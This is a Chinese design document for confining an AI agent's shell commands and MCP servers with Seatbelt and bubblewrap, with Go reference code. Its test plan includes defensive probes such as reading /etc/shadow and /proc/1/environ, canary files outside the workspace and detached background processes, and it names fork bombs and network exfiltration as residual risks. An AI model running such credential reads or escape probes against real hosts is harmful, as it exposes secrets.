darwin 固定使用 `/usr/bin/sandbox-exec`；linux 经 `exec.LookPath("bwrap")` 解析可执行文件。对应后端不可用、bwrap user namespace 不可用或生产参数探针失败时，应用 OnStart 失败，**不静默降级到 host**。Windows 使用 Host 是明确的平台契约，不属于降级。

沙箱后端下 MCP server 显式 cwd 越界仍在 `config.Load` fail-fast；空 cwd 归一化为 WorkspaceRoot。该校验只依赖固定平台策略，不引入 sandbox 配置。

## 7. MCP 供应链收敛

`pi/mcp` 的 stdio transport 当前直接 `os/exec` 拉起 server（argv 模型，transport_stdio.go:167），并自行设置进程组（transport_stdio.go:170 的 `configureProcessGroup`）。本轮改为沙箱化拉起，但**不让 `pi/mcp` 导入 `pi/harness/tools` 与 `pi/harness/sandbox`**——MCP 是通用扩展通道，不应反向依赖 Agent 工具包或命令执行契约（沙箱 env 构造在组合根 MCP driver 完成，host 路径维持现状）：

- `pi/mcp.StdioTransportOptions` 增加可选 `BuildCommand func() (*exec.Cmd, error)`，与旧字段严格互斥：
  - `BuildCommand == nil`：使用现有 `Command/Args/Env/WorkDir` 字段，行为完全兼容。
  - `BuildCommand != nil`：`Command/Args/Env/WorkDir` 必须为零值，否则 `NewStdioTransport` 构造时报错（防止两半配置静默拼接）；回调返回 `nil, nil` 同样报错。
- 注入点在 `infrastructure/driver/mcp`（组合根一侧）：driver 捕获 `CommandRunner.BuildArgv` 形成回调，连同按 §5.2 构造的 MCP payload 环境一起传入。`pi/mcp` 只看到一个进程构造函数，对沙箱与 tools 包零感知。
- **进程组设置收口到 Runner**：使用 `BuildCommand` 时，transport 内重复的 `configureProcessGroup` 必须删除/跳过（两者都给 `SysProcAttr` 赋值，重复设置会互相覆盖）；transport 保留 kill/wait 生命周期不变。
- 沙箱开启时 MCP server 与 exec 命令同等级隔离；`host` 后端维持现状行为（HostRunner 同样经回调注入，行为等价）。
- MCP 的环境构造、cwd 约束按 §5.2、§5.6 分流，不复用 exec 的模型输入通道。
- HTTP MCP server 不涉及本地进程，不受影响。

## 8. Fx 装配

- **Provider 所有权唯一**（防 Fx duplicate provider），注册关系固定为：
  ```text
  pi.CommandRunnerRegister            # SDK 项，fx.Provide(默认 HostRunner)
  infrastructure/driver/sandbox       # 组合根 driver：
    Register = fx.Options(
      fx.Decorate(chooseRunner), # GOOS 自动替换：darwin→seatbelt，
    )                                    # linux→bwrap，windows→Host
    fx.Invoke(forceInstantiateRunner) # 防惰性构造逃过探针（探针见下条）
  ```
  `pi.Register`、CLI、server 都显式包含 `CommandRunnerRegister`（`fx.Decorate` 只能替换已存在对象）；go-reagent 的 CLI（包括 env 模式）与 server 再无条件包含 sandbox driver。`ReadOnlyToolsRegister` 等其他注册模块不提供 Runner；MCP transport 也是消费者，driver 不能挂在"启用 exec 工具"开关下。SDK 自身不做平台替换，其他 SDK 调用方不注册 driver 时仍获得默认 HostRunner。
- **OnStart 探针入口**（不扩大 `CommandRunner` 主接口）：`pi/harness/sandbox` 为每个后端导出独立探针函数（bwrap 用 §5.1 完整生产参数组合，host 无需探针）；sandbox driver 注册 OnStart hook，按所选后端调用对应探针，失败即启动失败不降级。探针放 driver 的 hook 而非 Runner 构造函数，保证 Fx 惰性构造下"配置了沙箱但从未实例化"也必然触发校验。
- `ProcessSupervisor` 依赖 `Runner`；未启用 exec 时 supervisor 可不构造，Runner 独立存在。
- exec 工具描述、CLI banner 经 `Runner.Policy()` 生成，不读取配置副本，保证展示与实际生效策略一致。

## 9. exec 工具协议与描述调整

- 工具参数协议不变（`command/workdir/env/yieldMs/background/timeout`），模型无感知切换。
- 工具描述按 `Runner.Policy()` 生成，**如实口径**：
  - `host`：保留现有非沙箱警告。
  - 沙箱后端："命令在受限沙箱中执行（/bin/sh）：工作区是唯一可写业务路径；只允许读取工作区与固定系统路径；网络可用。"
- 错误分层（对应 §4 三层语义）：
  - **策略拒绝**（Build error：`env_contract_rejected/workdir_rejected`）：结构化启动错误，形成 `IsError=true` 文本结果回模型（模型可修正后重试），Details 记录 `category=startup_rejected`、`backend`、拒绝原因——**不伪造命令退出码**。
  - **spawn 失败**（Start error）：`category=spawn_failed`，同样 `IsError=true`。
  - **命令真实非零退出**（ProcessState）：沿用现有行为，Details 含 exitCode。
- 沙箱内命令因文件或进程策略失败属于第三层，按普通非零退出处理，不引入新错误码。

## 10. 残余风险（如实记录，不计入本轮验收）

- **setsid 脱离进程残留（host/seatbelt）**：进程组 kill 无法命中主动 `setsid()`/双 fork 脱离的后台进程（如 `nohup`、`setsid`、自 daemon 化程序）。host/seatbelt 只承诺终止原进程组（§4.2）；有强清理需求的部署应使用 bwrap（PID namespace 级清理）。
- **资源耗尽**：fork 炸弹、进程数、磁盘与私有 tmp 写满均无内核级限额。缓解现状仅有 supervisor 超时 kill 与 deny 规则。`container` 后端第二轮提供 pids/memory/tmpfs 安全默认值；seatbelt/bwrap 如需限额，依赖外层 systemd/launchd 或部署方 cgroup，不属于本轮。
- **seatbelt 根目录可读**：`(allow file-read* (literal "/"))` 是 sh 启动的硬需求（实测），泄露面为根目录条目清单。
- **seatbelt deprecated**：苹果可能在后续 macOS 移除 `sandbox-exec`；届时 macOS 档位需要切换到 `container` 或 Endpoint Security 方案。
- **内核漏洞**：namespace 与 seatbelt 都是内核机制，内核 0day/Nday 不在威胁模型内。
- **网络固定开放**：沙箱阻断工作区外文件、宿主环境和宿主进程访问，但工作区内数据仍可经网络外传；需要断网的部署必须使用外层防火墙或容器网络策略，本轮不提供命令级开关。

## 11. 实施顺序

0. ~~安全原型~~：**全部完成**——Seatbelt（§5.5 矩阵，macOS 26）与 Bubblewrap（§5.1 矩阵，Ubuntu 24.04）原型均已通过，结论已回填对应章节。
1. **纯重构**：抽 `CommandRunner` 薄接口（返回 `*exec.Cmd`），落地三层包结构——`pi/harness/sandbox`（接口、HostRunner、`ShellInvocation`、`ConfigureProcessGroup`、环境契约 helper 随迁，均为现状代码原样搬迁）、`pi/harness/sandbox`（空占位）、`pi/harness/tools`（退役 `child_process.go`）；`NewChildProcess` 迁移为 `HostRunner`；supervisor 与 MCP transport 生命周期不变；相关测试文件随包迁移、断言不改全部通过，新增 §4.1 shell 契约测试（含 `cmd.exe /d /s /c`）。
2. **环境构造拆分 + 两个原生后端**：exec/MCP 各自 env 构造函数、Runner 契约中央校验、`pi/harness/sandbox` 子包落地固定 allow/零透传/零额外挂载的 SeatbeltRunner 与 BubblewrapRunner；组合根新增“按 GOOS 自动选择 + OnStart 探针”，不读取 config；优先将 §5.1/§5.5 验证矩阵固化为自动化集成测试。
3. **MCP stdio 收敛**：`StdioTransportOptions` 增加 `BuildCommand` 回调，driver 注入 `BuildArgv`（cwd 归一化），删除 transport 内重复的进程组设置。
4. **ContainerRunner**（第二轮，独立设计文档：容器生命周期、kill 原型、网络拓扑、资源默认值；不承诺兼容本轮接口）。

每步独立可发布；第 1 步除 §4.2 的 `WaitDelay` 例（有界 pipe 等待，原本会永久阻塞的自带缺陷）外不改任何行为，是后续全部工作的安全底座。

## 12. 验证与验收

必须覆盖：

- **shell 契约**：host Unix `$SHELL -lc`、host Windows `cmd.exe /d /s /c` 行为固定（重构前后一致）；沙箱后端固定 `/bin/sh -c`。
- **Build 契约**（按后端分断）：返回的 `*exec.Cmd` 具有正确的 wrapper argv 前缀、`Dir=WorkDir`；**host：`Env=PayloadEnv`**（host 无 wrapper，§5.3）；**沙箱后端：`Env=WrapperEnv` 且不含任何 PayloadEnv 键**，payload 注入位置正确（bwrap `--setenv` / seatbelt `env -i` 在沙箱边界内侧）；`BuildArgv` 空 argv 拒绝（单元测试，防实现直取 `argv[0]` panic）。
- **环境边界**：非 host 后端子进程不可见宿主敏感变量（测试注入伪密钥断言）；沙箱后端契约变量缺失/重复/值不匹配即 `env_contract_rejected`，构造函数内覆盖 `PATH`/`HOME`/`TMPDIR` 被拒；**host 后端不校验契约变量且保持现状覆盖语义**；helper 输出去重且排序；MCP server env 仅对应 MCP 进程可见，不合流进 exec。
- **seatbelt**（§5.5 矩阵全部自动化 + 追加）：工作区外读写 EPERM（用 WorkspaceRoot 外 canary 的绝对路径断言）、宿主 signal EPERM、子进程 kill 成功、宿主进程枚举不可见、`test -e` 无存在性泄露、固定网络可达、`-D` 注入生效、WorkspaceRoot 符号链接场景写入成功。
- **bwrap 文件系统负向测试**：在 WorkspaceRoot 外创建临时 canary 文件后按绝对路径读 → 失败；读 `/etc/shadow` → 失败；`/proc/1/environ` 可读但只含固定 WrapperEnv；写 `/usr`、`/etc` 失败；写 WorkspaceRoot 成功；固定网络可达。
- **kill 契约**：各后端原进程组终止（集成测试）；`setsid`/双 fork 变体无残留断言**仅对 bwrap 执行**（PID namespace 级清理），host/seatbelt 不断言（§4.2 如实承诺）；全后端 `setsid sleep 1000 &` 场景下 `Wait()` 在 `WaitDelay` 上限内有界返回，且按 §4.2 两档分别断言——直接 shell 非零退出 → `*exec.ExitError`；直接 shell 成功退出、后台后代持管道 → `errors.Is(err, exec.ErrWaitDelay)` 且 Details `category=pipe_wait_expired`；supervisor `Close()` 不卡死。
- **WorkDir 边界**：WorkDir 越界 `workdir_rejected`（按 EvalSymlinks 真实路径判断，含符号链接逃逸负向测试）；MCP 空 cwd 归一化为 WorkspaceRoot、显式 cwd 越界 Load 报错；工作区外且不在默认系统路径内的 argv[0] 执行失败。
- **平台选择**：darwin→seatbelt、linux→bubblewrap、windows→host；darwin/linux 对应二进制缺失或探针失败时启动失败且不降级；CLI 两种模式与 server 行为一致；`fx.Invoke` 保证无消费者时也触发。
- **MCP**：stdio server 经 `BuildCommand` 回调拉起，`pi/mcp` 不导入 `pi/harness/tools` 与 `pi/harness/sandbox`（依赖方向测试）；`BuildCommand` 与 `Command/Args/Env/WorkDir` 同时非零值时构造报错、回调返回 `nil, nil` 报错、回调为 nil 时旧字段行为完全兼容；使用回调时 transport 不再重复设置 `SysProcAttr`；沙箱拉起时同样受环境过滤与 cwd 约束；Argv 不经 shell（含空格/引号参数原样传递）。
- **展示一致性**：exec 工具描述与 CLI banner 跟随 `Runner.Policy()`；口径不超出 §9 的如实描述。

CI 要求：本轮 macOS（seatbelt）与 Linux（bwrap）两个 job 真实执行对应集成测试，不允许"按平台 skip 导致后端从未被执行"；Docker job 随第二轮 container 实现加入。

最终验证命令：

```bash
go test -count=1 ./...
go test -race ./...
go vet ./...
git diff --check
```

## 13. 验收结果

满足以下条件时视为完成：

- `ProcessSupervisor` 与 MCP transport 不再直接引用 `os/exec` 构造逻辑，命令构造全部经 `CommandRunner`，生命周期管理代码不变。
- SDK 调用方只注册 `CommandRunnerRegister` 时保持 HostRunner 现状；go-reagent 产品在 darwin/linux 自动启用平台沙箱，windows 明确使用 Host。所有后端统一增加 §4.2 `WaitDelay` 有界 pipe 等待。
- darwin/linux 下工作区是唯一可写业务路径；Shell 命令无法读取工作区与固定系统路径之外的路径，无法继承宿主环境变量，无法枚举或 signal 宿主进程；网络固定可用；进程终止承诺符合 §4.2 分档。
- wrapper 进程环境不被模型或 MCP 配置污染；exec 与 MCP 环境构造函数分离，MCP 密钥不合流进 exec。
- stdio MCP Server 与 exec 命令共享同一隔离级别，Argv 模型不经 shell，`pi/mcp` 不依赖 `pi/harness/tools` 与 `pi/harness/sandbox`。
- 策略拒绝是结构化启动错误（Details 含 backend 与拒绝类别），不伪造退出码。
- 平台后端不可用时 OnStart fail-fast；无静默降级。
- deny 规则中间件与沙箱并存，各自独立生效。
- 资源耗尽、根目录可读等残余风险在 §10 如实记录，README 与工具描述无超出口径的安全承诺。
- 所有单元、集成、race、vet 验证通过；macOS 与 Linux CI job 真实执行对应后端测试。

## 14. 参考实现骨架

本节是可直接落地的参考实现骨架，与正文条款一一对应；平台策略不读取 config，网络固定 allow，宿主变量透传与额外挂载固定为空。

**包结构（v7.1 定，单包收口）**：

```text
pi/harness/sandbox/   # 统一命令执行边界
  runner.go           # Runner 契约、WorkDir、payload 环境契约
  host.go             # HostRunner、Host 环境、ShellInvocation
  process_group_*.go  # ConfigureProcessGroup / KillProcessGroup
  bubblewrap.go / seatbelt.go
  platform.go         # 平台选择与后端探针
  runner_test.go / host_test.go / sandbox_test.go
pi/harness/tools/     # exec/process 等 Agent Tool 与 supervisor（退役 child_process.go）

依赖：tools → sandbox；组合根与 MCP driver → sandbox；pi/mcp → sandbox 无依赖（回调注入）
```

### 14.1 `pi/harness/sandbox/runner.go`——接口与公共契约（§4）

```go
package sandbox

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// SandboxPolicy 是后端的生效策略，用于工具描述、CLI banner 与 Details。
type SandboxPolicy struct {
	Backend string // host / seatbelt / bubblewrap
	Network string // 本轮固定 allow
}

// CommandSpec 描述一次命令执行的共享约束。
type CommandSpec struct {
	// WorkDir 是本次 cwd 的宿主绝对路径，必须位于 WorkspaceRoot 内。
	// 边界对 WorkDir 与 WorkspaceRoot 都用 EvalSymlinks 真实路径判断（§12）；
	// host 后端维持现状语义、不做此约束（§5.6），由沙箱后端在 Build 时校验。
	WorkDir string
	// PayloadEnv 是调用方准备好的最终 payload 环境（KEY=VALUE 列表）。
	// 沙箱后端在沙箱边界内侧注入；host 后端直接作为进程环境。
	PayloadEnv []string
}

// Build 层错误（§4 错误语义第 1 层：策略拒绝，调用方转结构化启动错误）。
var (
	ErrEnvContractRejected = errors.New("env_contract_rejected")
	ErrWorkDirRejected     = errors.New("workdir_rejected")
)

// ProcessPipeWaitDelay 有界关闭遗留管道（§4.2）。触发语义分两档：
// 直接子进程非零退出 → 正常 *exec.ExitError；成功退出但后代持管道 → exec.ErrWaitDelay。
const ProcessPipeWaitDelay = 3 * time.Second

// Runner 构造受限的、未启动的 *exec.Cmd。
type Runner interface {
	Policy() SandboxPolicy
	BuildShell(command string, spec CommandSpec) (*exec.Cmd, error)
	// BuildArgv 构造不经 shell 的直接执行进程（argv[0] 为可执行文件），
	// 用于 MCP stdio。空 argv 返回结构化拒绝错误（不访问 argv[0]）。
	BuildArgv(argv []string, spec CommandSpec) (*exec.Cmd, error)
}

// BuildCommand 供各后端收尾：进程组 + WaitDelay + Dir（dir 必须是 canonical 路径）。
func BuildCommand(path string, argv []string, dir string) *exec.Cmd {
	child := exec.Command(path, argv...)
	child.Dir = dir
	ConfigureProcessGroup(child)
	child.WaitDelay = ProcessPipeWaitDelay
	return child
}

// ResolveWorkDir 按 EvalSymlinks 真实路径校验 workDir 位于 workspaceRoot 内，
// 返回 canonical 路径——调用方必须把返回值用于 cmd.Dir 与沙箱内 --chdir，
// 避免"边界按真实路径判、执行却用原始路径"的符号链接错位（§12）。
func ResolveWorkDir(workDir, workspaceRoot string) (string, error) {
	if !filepath.IsAbs(workDir) {
		return "", fmt.Errorf("%w: %q 不是绝对路径", ErrWorkDirRejected, workDir)
	}
	realWork, err := filepath.EvalSymlinks(workDir)
	if err != nil {
		return "", fmt.Errorf("%w: %v", ErrWorkDirRejected, err)
	}
	realRoot, err := filepath.EvalSymlinks(workspaceRoot)
	if err != nil {
		return "", fmt.Errorf("%w: 工作区不存在: %q", ErrWorkDirRejected, workspaceRoot)
	}
	// filepath.Rel 优于 HasPrefix：天然拒绝 "workspaces" vs "workspaces-evil"。
	rel, err := filepath.Rel(realRoot, realWork)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return "", fmt.Errorf("%w: %q 越出工作区 %q", ErrWorkDirRejected, workDir, realRoot)
	}
	if info, err := os.Stat(realWork); err != nil || !info.IsDir() {
		return "", fmt.Errorf("%w: %q 不是已存在目录", ErrWorkDirRejected, workDir)
	}
	return realWork, nil
}

// kvOK 变量名合法性（与 processEnvironment 现状一致：非空、不含 = / NUL）。
func kvOK(key string) bool {
	return key != "" && !strings.ContainsAny(key, "=\x00")
}

// validateEnvList 全后端统一校验（§5.3）：KEY=VALUE、名字合法、值不含 NUL、无重复。
func validateEnvList(env []string) error {
	seen := make(map[string]struct{}, len(env))
	for _, kv := range env {
		key, _, ok := strings.Cut(kv, "=")
		if !ok || !kvOK(key) {
			return fmt.Errorf("无效环境变量名: %q", key)
		}
		if strings.IndexByte(kv, 0) >= 0 {
			return fmt.Errorf("环境变量 %s 包含 NUL", key)
		}
		if _, exists := seen[key]; exists {
			return fmt.Errorf("环境变量重复: %s", key)
		}
		seen[key] = struct{}{}
	}
	return nil
}
```

### 14.2 `pi/harness/sandbox/host.go`——纯重构（§11 第 1 步，行为与 `NewChildProcess` 逐字等价）

> **归属说明（v7.1 定）**：Host 是 Runner 的明确无隔离后端，不是独立子系统。接口、HostRunner、环境契约、Shell、进程组和平台沙箱后端统一放在 `pi/harness/sandbox`，减少中间包与跨包前缀；`tools`、MCP driver 和组合根只依赖这一执行边界。

```go
package sandbox

import (
	"errors"
	"fmt"
	"os/exec"
)

// HostRunner 是默认后端：不构造 wrapper，命令经 ShellInvocation 现状契约直接执行。
type HostRunner struct{ policy SandboxPolicy }

func NewHostRunner() *HostRunner {
	return &HostRunner{policy: SandboxPolicy{Backend: "host", Network: "allow"}}
}

func (r *HostRunner) Policy() SandboxPolicy { return r.policy }

func (r *HostRunner) BuildShell(command string, spec CommandSpec) (*exec.Cmd, error) {
	if command == "" {
		return nil, errors.New("exec: 命令为空")
	}
	// host 不校验契约变量（§5.3），只做全后端统一的格式/NUL 校验；
	// WorkDir 维持现状语义不做 WorkspaceRoot 约束（§5.6）。
	if err := validateEnvList(spec.PayloadEnv); err != nil {
		return nil, fmt.Errorf("%w: %v", ErrEnvContractRejected, err)
	}
	shell, arguments := ShellInvocation(command) // $SHELL -lc / cmd.exe /d /s /c（§4.1，逐字保留）
	child := BuildCommand(shell, arguments, spec.WorkDir)
	child.Env = spec.PayloadEnv // host 无 wrapper：PayloadEnv 直接作为进程环境（§5.3）
	return child, nil
}

func (r *HostRunner) BuildArgv(argv []string, spec CommandSpec) (*exec.Cmd, error) {
	if len(argv) == 0 {
		return nil, errors.New("BuildArgv: 空 argv")
	}
	if err := validateEnvList(spec.PayloadEnv); err != nil {
		return nil, fmt.Errorf("%w: %v", ErrEnvContractRejected, err)
	}
	child := BuildCommand(argv[0], argv[1:], spec.WorkDir)
	child.Env = spec.PayloadEnv
	return child, nil
}
```

`NewChildProcess` 退役：exec 工具调用点改为先按现状语义合并 `os.Environ()` 与 overrides 得到 `PayloadEnv`（原 `processEnvironment` 的 PATH 禁改、HOME/TMPDIR 可覆盖逻辑原样保留在此构造函数），再交 `HostRunner.BuildShell`。

### 14.3 `pi/harness/sandbox/runner.go` 内的环境构造 helper（§5.2，仅沙箱后端）

```go
package sandbox

import (
	"fmt"
	"sort"
	"strings"
)

// 契约变量与固定基础值（§5.2 / §5.4）。语言与终端取固定值：沙箱无 PTY，
// 且继承宿主 locale/终端设置会泄露宿主个性化信息。LANG/TERM 是基础项
// 但非契约变量——外部输入可覆盖（见下）。
const (
	SandboxPath = "/usr/bin:/bin"
	SandboxLang = "C.UTF-8"
	SandboxTerm = "dumb"
)

// SandboxBaseEnv 返回沙箱后端基础项。tmpDir 按 §5.4 分档传入：
// seatbelt 为 <WorkspaceRoot>/.tmp，bubblewrap 为 /tmp。
func SandboxBaseEnv(workspaceRoot, tmpDir string) []string {
	return []string{
		"HOME=" + workspaceRoot,
		"LANG=" + SandboxLang,
		"PATH=" + SandboxPath,
		"TERM=" + SandboxTerm,
		"TMPDIR=" + tmpDir,
	}
}

// contractKeys 只含 PATH/HOME/TMPDIR（§5.3 中央校验范围一致）。
// 外部输入设置任何一个都整体拒绝——不做"同值放行"特例，语义最简单。
var contractKeys = map[string]struct{}{"PATH": {}, "HOME": {}, "TMPDIR": {}}

// BuildSandboxPayloadEnv 合并基础项与外部输入并输出最终 PayloadEnv。
// 语义（按审计第 3 条固化）：
//   - 每项必须含 "="、名字合法、值不含 NUL，否则整体拒绝；
//   - 契约变量（PATH/HOME/TMPDIR）出现在外部输入中即拒绝（不看值）；
//   - 非契约变量同名合并，后写胜出（map 覆盖语义；LANG/TERM 可被覆盖）；
//   - 输出按键排序，天然无重复。
func BuildSandboxPayloadEnv(workspaceRoot, tmpDir string, extra []string) ([]string, error) {
	merged := map[string]string{}
	for _, kv := range SandboxBaseEnv(workspaceRoot, tmpDir) {
		k, v, _ := strings.Cut(kv, "=")
		merged[k] = v
	}
	for _, kv := range extra {
		key, value, ok := strings.Cut(kv, "=")
		if !ok || !kvOK(key) || strings.IndexByte(kv, 0) >= 0 {
			return nil, fmt.Errorf("%w: 非法环境项 %q", ErrEnvContractRejected, kv)
		}
		if _, isContract := contractKeys[key]; isContract {
			return nil, fmt.Errorf("%w: 禁止外部输入设置契约变量 %s", ErrEnvContractRejected, key)
		}
		merged[key] = value
	}
	out := make([]string, 0, len(merged))
	for k, v := range merged {
		out = append(out, k+"="+v)
	}
	sort.Strings(out)
	return out, nil
}

// ValidateSandboxPayloadEnv 是 Runner 的中央收口校验（§5.3）：契约变量必须存在、
// 唯一且值等于后端预期；经 helper 产出的环境必然通过。
func ValidateSandboxPayloadEnv(env []string, workspaceRoot, tmpDir string) error {
	if err := validateEnvList(env); err != nil {
		return err
	}
	count := map[string]int{}
	value := map[string]string{}
	for _, kv := range env {
		k, v, _ := strings.Cut(kv, "=")
		count[k]++
		value[k] = v
	}
	want := map[string]string{"PATH": SandboxPath, "HOME": workspaceRoot, "TMPDIR": tmpDir}
	for _, key := range []string{"PATH", "HOME", "TMPDIR"} {
		if count[key] != 1 || value[key] != want[key] {
			return fmt.Errorf("%w: 契约变量 %s 缺失/重复/值不匹配", ErrEnvContractRejected, key)
		}
	}
	return nil
}
```

exec 与 MCP 调用同一 helper；沙箱 exec 不读取宿主环境，MCP 只合并对应 server 的显式 env（§5.2）。

### 14.4 `pi/harness/sandbox/bubblewrap.go`——参数组合（§5.1 原型实测）

```go
package sandbox

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

)

// BubblewrapRunner 用 §5.1 原型实测的参数组合构造 bwrap 命令。
type BubblewrapRunner struct {
	wrapPath     string
	workspaceRoot string // EvalSymlinks 后的真实路径
	policy        SandboxPolicy
}

func NewBubblewrapRunner(wrapPath, workspaceRoot string) (*BubblewrapRunner, error) {
	symlinks, err := filepath.EvalSymlinks(workspaceRoot)
	if err != nil {
		return nil, fmt.Errorf("workspace root 解析失败: %w", err)
	}
	return &BubblewrapRunner{
		wrapPath: wrapPath, workspaceRoot: symlinks,
		policy: SandboxPolicy{Backend: "bubblewrap", Network: "allow"},
	}, nil
}

func (r *BubblewrapRunner) Policy() SandboxPolicy { return r.policy }

// bwrapWrapperEnv 是 bwrap 自身（PID 1）的环境，即 /proc/1/environ 的内容——
// 必须最小化（§5.1 实证：wrapper 环境含密钥时 payload 可经此读到）。
var bwrapWrapperEnv = []string{"PATH=" + SandboxPath}

func (r *BubblewrapRunner) BuildShell(command string, spec CommandSpec) (*exec.Cmd, error) {
	if strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("BuildShell: 空命令")
	}
	workDir, err := r.validate(spec)
	if err != nil {
		return nil, err
	}
	argv := r.baseArgv(spec, workDir)
	argv = append(argv, "--", "/bin/sh", "-c", command)
	child := BuildCommand(r.wrapPath, argv, workDir)
	child.Env = bwrapWrapperEnv
	return child, nil
}

// BuildArgv 不经 shell 直执（MCP stdio 形态）。
func (r *BubblewrapRunner) BuildArgv(inner []string, spec CommandSpec) (*exec.Cmd, error) {
	if len(inner) == 0 {
		return nil, fmt.Errorf("BuildArgv: 空 argv")
	}
	workDir, err := r.validate(spec)
	if err != nil {
		return nil, err
	}
	full := r.baseArgv(spec, workDir)
	full = append(full, "--")
	full = append(full, inner...)
	child := BuildCommand(r.wrapPath, full, workDir)
	child.Env = bwrapWrapperEnv
	return child, nil
}

// validate 是两个 Build 共用的契约收口（§4 / §5.3），返回 canonical WorkDir。
func (r *BubblewrapRunner) validate(spec CommandSpec) (string, error) {
	workDir, err := ResolveWorkDir(spec.WorkDir, r.workspaceRoot)
	if err != nil {
		return "", err
	}
	if err := ValidateSandboxPayloadEnv(spec.PayloadEnv, r.workspaceRoot, "/tmp"); err != nil {
		return "", fmt.Errorf("%w: %v", ErrEnvContractRejected, err)
	}
	return workDir, nil
}

// baseArgv 返回 §5.1 固定 allow 参数组合。--chdir 用 canonical WorkDir。
func (r *BubblewrapRunner) baseArgv(spec CommandSpec, workDir string) []string {
	argv := []string{
		"--die-with-parent",
		"--unshare-user", "--unshare-pid", "--unshare-ipc", "--unshare-uts",
	}
	argv = append(argv,
		"--clearenv", // 必需：缺失时 payload 继承 wrapper 环境（原型实证）
		"--ro-bind", "/usr", "/usr",
		"--ro-bind", "/bin", "/bin",
		"--ro-bind", "/lib", "/lib",
	)
	if _, err := os.Stat("/lib64"); err == nil { // x86_64 动态加载器必需（原型实测）
		argv = append(argv, "--ro-bind", "/lib64", "/lib64")
	}
	for _, etc := range []string{"/etc/hosts", "/etc/resolv.conf", "/etc/ssl"} {
		argv = append(argv, "--ro-bind", etc, etc)
	}
	argv = append(argv, "--tmpfs", "/tmp", "--proc", "/proc", "--dev", "/dev",
		"--bind", r.workspaceRoot, r.workspaceRoot,
		"--chdir", workDir)
	for _, kv := range spec.PayloadEnv { // --setenv：注入在沙箱边界内侧（§5.3）
		key, value, _ := strings.Cut(kv, "=")
		argv = append(argv, "--setenv", key, value)
	}
	return argv
}
```

### 14.5 `pi/harness/sandbox/seatbelt.go`——profile 生成（§5.5 实测版）

```go
package sandbox

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

)

// SeatbeltRunner 构造 sandbox-exec 包装的命令。
type SeatbeltRunner struct {
	sandboxExecPath string
	profile         string   // 固定 allow profile
	dArgs           []string // -D WORKSPACE_ROOT=<realpath>
	workspaceRoot   string   // EvalSymlinks 后的真实路径
	tmpDir          string   // <workspaceRoot>/.tmp（§5.4，Workspace 启动时创建）
	policy          SandboxPolicy
}

func NewSeatbeltRunner(sandboxExecPath, workspaceRoot string) (*SeatbeltRunner, error) {
	symlinks, err := filepath.EvalSymlinks(workspaceRoot)
	if err != nil {
		return nil, fmt.Errorf("workspace root 解析失败: %w", err)
	}
	if strings.ContainsAny(symlinks, "\"\\\n") {
		return nil, fmt.Errorf("路径含 profile 注入字符: %q", symlinks)
	}
	tmpDir := filepath.Join(symlinks, ".tmp") // §5.4：单一共享 .tmp，Workspace 启动时创建
	if err := os.MkdirAll(tmpDir, 0o700); err != nil {
		return nil, fmt.Errorf("创建 Seatbelt TMPDIR 失败: %w", err)
	}
	return &SeatbeltRunner{
		sandboxExecPath: sandboxExecPath,
		profile:         seatbeltProfile(),
		dArgs:           []string{"-D", "WORKSPACE_ROOT=" + symlinks},
		workspaceRoot:   symlinks,
		tmpDir:          tmpDir,
		policy:          SandboxPolicy{Backend: "seatbelt", Network: "allow"},
	}, nil
}

func (r *SeatbeltRunner) Policy() SandboxPolicy { return r.policy }

// seatbeltProfile 生成固定 allow profile；WorkspaceRoot 经 -D 参数注入。
func seatbeltProfile() string {
	return `(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow signal (target same-sandbox))
(allow file-read* (literal "/"))
(allow file-read-metadata (literal "/"))
(allow file-read-metadata (subpath "/usr") (subpath "/bin") (subpath "/sbin")
                         (subpath "/System") (subpath "/Library/Frameworks")
                         (subpath (param "WORKSPACE_ROOT")))
(allow file-read* (subpath "/usr") (subpath "/bin") (subpath "/sbin")
                  (subpath "/System") (subpath "/Library/Frameworks")
                  (subpath (param "WORKSPACE_ROOT")))
(allow file-write* (subpath (param "WORKSPACE_ROOT")))
(allow file-write* (literal "/dev/null"))
(allow file-read* (literal "/private/etc/resolv.conf"))
(allow file-read* (subpath "/private/etc/ssl"))
(allow mach-lookup (global-name "com.apple.system.opendirectoryd.libinfo"))
(allow network-outbound)`
}

func (r *SeatbeltRunner) BuildShell(command string, spec CommandSpec) (*exec.Cmd, error) {
	if strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("BuildShell: 空命令")
	}
	workDir, err := r.validate(spec)
	if err != nil {
		return nil, err
	}
	// argv 顺序：sandbox-exec -D K=V... -p <profile> env -i <PayloadEnv...> /bin/sh -c <command>。
	// env -i 是 payload 环境的沙箱边界内侧注入（§5.3）；sandbox-exec 自身拿 WrapperEnv。
	argv := append([]string{}, r.dArgs...)
	argv = append(argv, "-p", r.profile, "env", "-i")
	argv = append(argv, spec.PayloadEnv...)
	argv = append(argv, "/bin/sh", "-c", command)
	child := BuildCommand(r.sandboxExecPath, argv, workDir)
	child.Env = []string{"PATH=" + SandboxPath} // WrapperEnv 最小集
	return child, nil
}

// BuildArgv 同构：env -i 注入后 argv 直执（沙箱内无 shell）。
func (r *SeatbeltRunner) BuildArgv(inner []string, spec CommandSpec) (*exec.Cmd, error) {
	if len(inner) == 0 {
		return nil, fmt.Errorf("BuildArgv: 空 argv")
	}
	workDir, err := r.validate(spec)
	if err != nil {
		return nil, err
	}
	argv := append([]string{}, r.dArgs...)
	argv = append(argv, "-p", r.profile, "env", "-i")
	argv = append(argv, spec.PayloadEnv...)
	argv = append(argv, inner...)
	child := BuildCommand(r.sandboxExecPath, argv, workDir)
	child.Env = []string{"PATH=" + SandboxPath}
	return child, nil
}

// validate 契约收口同 bwrap；TMPDIR 按 §5.4 指向 workspaceRoot/.tmp。
func (r *SeatbeltRunner) validate(spec CommandSpec) (string, error) {
	workDir, err := ResolveWorkDir(spec.WorkDir, r.workspaceRoot)
	if err != nil {
		return "", err
	}
	if err := ValidateSandboxPayloadEnv(spec.PayloadEnv, r.workspaceRoot, r.tmpDir); err != nil {
		return "", fmt.Errorf("%w: %v", ErrEnvContractRejected, err)
	}
	return workDir, nil
}
```

### 14.6 `pi/harness/sandbox/platform.go` 内的探针（带超时，driver OnStart 调用）

```go
